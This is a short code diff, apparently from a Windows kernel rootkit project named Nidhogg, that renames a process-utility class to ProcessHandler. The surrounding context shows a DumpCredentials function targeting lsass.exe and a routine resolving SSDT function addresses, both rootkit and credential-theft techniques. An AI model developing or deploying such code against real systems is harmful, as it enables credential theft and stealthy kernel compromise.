@@ -1,7 +1,7 @@
 #include "pch.h"
 #include <bcrypt.h>
 #include "MemoryUtils.h"
-#include "ProcessUtils.h"
+#include "ProcessHandler.h"
 #include "MemoryAllocator.hpp"
 #include "MemoryHelper.hpp"
 
@@ -637,7 +637,7 @@ NTSTATUS MemoryUtils::DumpCredentials(ULONG* AllocationSize) {
 	if (this->lastLsassInfo.LastCredsIndex != 0)
 		return STATUS_ABANDONED;
 
-	NTSTATUS status = NidhoggProccessUtils->FindPidByName(L"lsass.exe", &lsassPid);
+	NTSTATUS status = NidhoggProcessHandler->FindPidByName(L"lsass.exe", &lsassPid);
 
 	if (!NT_SUCCESS(status))
 		return status;
@@ -1286,7 +1286,7 @@ PVOID MemoryUtils::GetSSDTFunctionAddress(const char* functionName) {
 	ULONG index = 0;
 	UCHAR syscall = 0;
 	ULONG csrssPid = 0;
-	NTSTATUS status = NidhoggProccessUtils->FindPidByName(L"csrss.exe", &csrssPid);
+	NTSTATUS status = NidhoggProcessHandler->FindPidByName(L"csrss.exe", &csrssPid);
 
 	if (!NT_SUCCESS(status))
 		return functionAddress;
@@ -1349,7 +1349,7 @@ PVOID MemoryUtils::GetFuncAddress(const char* functionName, const wchar_t* modul
 	ULONG searchedPid = pid;
 
 	if (searchedPid == 0) {
-		status = NidhoggProccessUtils->FindPidByName(L"csrss.exe", &searchedPid);
+		status = NidhoggProcessHandler->FindPidByName(L"csrss.exe", &searchedPid);
 
 		if (!NT_SUCCESS(status))
 			return functionAddress;
